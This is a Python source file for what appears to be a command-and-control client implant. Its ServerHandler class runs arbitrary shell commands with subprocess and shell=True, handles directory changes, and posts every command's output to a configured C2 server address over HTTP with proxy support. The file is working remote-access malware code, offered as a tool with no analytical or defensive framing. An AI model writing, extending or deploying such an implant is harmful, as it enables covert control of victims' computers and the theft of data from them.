import os
import time
import subprocess
from termcolor import colored
from requests import post, exceptions
from client_settings import (SERVER_IP, SERVER_PORT, PROXY, HEADER,  CMD_RESPONSE,
                             RESPONSE_KEY, CMD_REQUEST, DELAY, CLIENT_CREDENTIALS)


class ServerHandler():

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port


    # Function to post data to the c2 server
    def post_to_server(self, message, response_path=CMD_RESPONSE):
        try:
            post(f"http://{SERVER_IP}:{SERVER_PORT}{response_path}",
                 data={RESPONSE_KEY: message}, headers=HEADER, proxies=PROXY)
        except exceptions.RequestException:
            return


    @staticmethod
    def convert_text(text):
        return colored(text, "cyan", attrs=["bold"])


    def run_command(self, command):
        if command[:2] == 'cd' and command != 'cd':

            try:
                os.chdir(command[3:])
                result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                          stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = result.stdout.read() + result.stderr.read()
                result = "\n" + result.decode()

                if "The system cannot find the path specified." in result:
                    result = "\n"
                    self.post_to_server(result, response_path=CMD_RESPONSE)
                else:
                    self.post_to_server(result, response_path=CMD_RESPONSE)

            except(FileNotFoundError, IOError):
                error_message = "Directory does not exist!!! \n"
                self.post_to_server(error_message, response_path=CMD_RESPONSE)
        else:
            result = subprocess.Popen(command,stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                      stderr=subprocess.PIPE, shell=True)
            result = f"{result.stdout.read().decode()} \n {result.stderr.read().decode()}"
            self.post_to_server(result, response_path=CMD_RESPONSE)


